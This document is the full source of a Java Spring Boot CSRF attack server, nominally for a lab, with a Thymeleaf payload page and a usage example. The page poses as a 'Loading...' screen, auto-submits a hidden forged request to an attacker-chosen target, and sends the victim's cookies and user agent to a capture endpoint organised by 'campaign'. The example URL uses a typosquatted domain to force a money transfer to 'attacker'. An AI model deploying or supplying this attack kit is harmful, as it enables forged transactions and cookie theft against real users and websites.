```java
package com.lab.csrf;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import org.springframework.ui.Model;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

@SpringBootApplication
public class CsrfLabController {
    public static void main(String[] args) {
        SpringApplication.run(CsrfLabController.class, args);
    }
}

@Controller
class PayloadController {
    // Store captured requests
    private final Map<String, List<CapturedRequest>> captures = 
        new ConcurrentHashMap<>();
    
    @GetMapping("/")
    public String index(Model model) {
        model.addAttribute("campaigns", captures.keySet());
        return "index";
    }
    
    // Serve CSRF payload
    @GetMapping("/payload/{campaignId}")
    public String servePayload(@PathVariable String campaignId, 
                               @RequestParam String targetUrl,
                               @RequestParam String method,
                               @RequestParam(required = false) String params,
                               Model model) {
        model.addAttribute("campaignId", campaignId);
        model.addAttribute("targetUrl", targetUrl);
        model.addAttribute("method", method.toUpperCase());
        model.addAttribute("params", parseParams(params));
        return "csrf-payload";
    }
    
    // Capture exfiltrated data
    @PostMapping("/capture/{campaignId}")
    @ResponseBody
    public Map<String, String> captureData(
            @PathVariable String campaignId,
            @RequestBody Map<String, Object> data) {
        captures.computeIfAbsent(campaignId, 
            k -> Collections.synchronizedList(new ArrayList<>()))
            .add(new CapturedRequest(data));
        return Map.of("status", "captured");
    }
    
    // View captured data
    @GetMapping("/captures/{campaignId}")
    public String viewCaptures(@PathVariable String campaignId, 
                               Model model) {
        model.addAttribute("campaignId", campaignId);
        model.addAttribute("captures", 
            captures.getOrDefault(campaignId, List.of()));
        return "captures";
    }
    
    private Map<String, String> parseParams(String params) {
        if (params == null) return Map.of();
        Map<String, String> result = new HashMap<>();
        for (String pair : params.split("&")) {
            String[] kv = pair.split("=", 2);
            if (kv.length == 2) result.put(kv[0], kv[1]);
        }
        return result;
    }
    
    record CapturedRequest(Map<String, Object> data, 
                          long timestamp) {
        CapturedRequest(Map<String, Object> data) {
            this(data, System.currentTimeMillis());
        }
    }
}
```

**Thymeleaf template** (`src/main/resources/templates/csrf-payload.html`):

```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Loading...</title>
</head>
<body>
    <h3>Please wait...</h3>
    
    <form id="csrfForm" th:action="${targetUrl}" 
          th:method="${method}" style="display:none">
        <input th:each="entry : ${params}" 
               type="hidden" 
               th:name="${entry.key}" 
               th:value="${entry.value}"/>
    </form>
    
    <script th:inline="javascript">
        const campaignId = /*[[${campaignId}]]*/ '';
        const form = document.getElementById('csrfForm');
        
        // Auto-submit
        form.submit();
        
        // Attempt to exfiltrate success (same-origin only)
        setTimeout(() => {
            fetch(`/capture/${campaignId}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    cookies: document.cookie
                })
            });
        }, 1000);
    </script>
</body>
</html>
```

**pom.xml**:

```xml
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-thymeleaf</artifactId>
    </dependency>
</dependencies>
```

**Usage example**:
```text
http://typosquatted-domain.lab/payload/campaign1?targetUrl=http://target.lab/transfer&method=POST&params=to=attacker&amount=1000
```

##
##
